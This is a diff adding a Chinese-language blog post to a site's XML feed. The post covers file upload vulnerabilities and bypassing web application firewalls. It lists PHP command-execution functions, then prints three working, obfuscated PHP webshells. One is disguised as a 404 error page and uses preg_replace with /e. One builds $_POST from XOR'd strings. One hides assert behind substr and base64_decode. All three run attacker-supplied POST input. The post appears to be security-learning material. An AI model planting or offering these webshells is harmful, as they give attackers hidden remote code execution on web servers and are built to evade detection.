@@ -3,6 +3,25 @@
   
     
     <entry>
+      <title>文件上传</title>
+      <link href="/2019/01/09/File-upload/"/>
+      <url>/2019/01/09/File-upload/</url>
+      
+        <content type="html"><![CDATA[<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><blockquote><p>Web应用程序通常会有文件上传的功能，只要 Web应用程序允许上传文件，就有可能存在文件上传漏洞</p></blockquote><h2 id="php执行命令"><a href="#php执行命令" class="headerlink" title="php执行命令"></a>php执行命令</h2><ol><li>执行代码的方式执行命令</li><li>直接执行系统命令</li></ol><p>常用函数：<br>eval()<br>assert()<br>passthru()<br>preg_replace(“1/e”,command,”test”);</p><p>system()<br>exec()<br>exec_shell()</p><p>木马可分为大马和小马</p><h2 id="小马"><a href="#小马" class="headerlink" title="小马"></a>小马</h2><h3 id="一些绕过方法"><a href="#一些绕过方法" class="headerlink" title="一些绕过方法"></a>一些绕过方法</h3><p>404伪装<br><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;!DOCTYPE HTML <span class="hljs-keyword">PUBLIC</span> <span class="hljs-string">"-//IETF//DTD HTML 2.0//EN"</span>&gt;<br>&lt;html&gt;&lt;head&gt;<br>&lt;title&gt;<span class="hljs-number">404</span> Not Found&lt;/title&gt;<br>&lt;/head&gt;&lt;body&gt;<br>&lt;h1&gt;Not Found&lt;/ht&gt;<br>&lt;p&gt;The requested URL was not found on this server.&lt;/p&gt;<br>&lt;/body&gt;&lt;/html&gt;<br><span class="hljs-meta">&lt;?php</span><br>@preg_replace(<span class="hljs-string">"/[pageerror]/e"</span>,$_POST[<span class="hljs-string">'error'</span>],<span class="hljs-string">"saft"</span>);<br>header(<span class="hljs-string">'HTTP/1.1 404 Not Found'</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure></p><p>正则拼接：<br><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>@$_++;  <span class="hljs-comment">// not defined variable ++,the result is 1</span><br>$__=(<span class="hljs-string">"#"</span>^<span class="hljs-string">"|"</span>);<br>$__.=(<span class="hljs-string">"."</span>^<span class="hljs-string">"~"</span>);<br>$__.=(<span class="hljs-string">"/"</span>^<span class="hljs-string">"`"</span>);<br>$__.=(<span class="hljs-string">"|"</span>^<span class="hljs-string">"/"</span>);<br>$__.=(<span class="hljs-string">"&#123;"</span>^<span class="hljs-string">"/"</span>);<br>$&#123;$__&#125;[!$_]($&#123;$__&#125;[$_]);<br><span class="hljs-comment">//$_POST[0]($_POST[1]);</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure></p><p><code>substr()</code>与<code>base64_decode</code>联用：<br><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>$O=substr(<span class="hljs-string">"Ping-Pong"</span>,<span class="hljs-number">5</span>,<span class="hljs-number">1</span>);<br>$R=substr(<span class="hljs-string">"MONSTER"</span>,<span class="hljs-number">3</span>,<span class="hljs-number">1</span>);<br>$you = <span class="hljs-string">'_'</span>.$O.<span class="hljs-string">'O'</span>.$R.<span class="hljs-string">'T'</span>;<br>$hack=base64_decode(<span class="hljs-string">"YXNzZXJ0"</span>);<br>$hack($&#123;$you&#125;[<span class="hljs-number">1</span>]);<br><span class="hljs-comment">//assert($_POST[1])</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure></p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> 文件上传 </tag>
+            
+            <tag> WAF绕过 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    <entry>
       <title>SQL注入</title>
       <link href="/2019/01/01/SQL-injection/"/>
       <url>/2019/01/01/SQL-injection/</url>
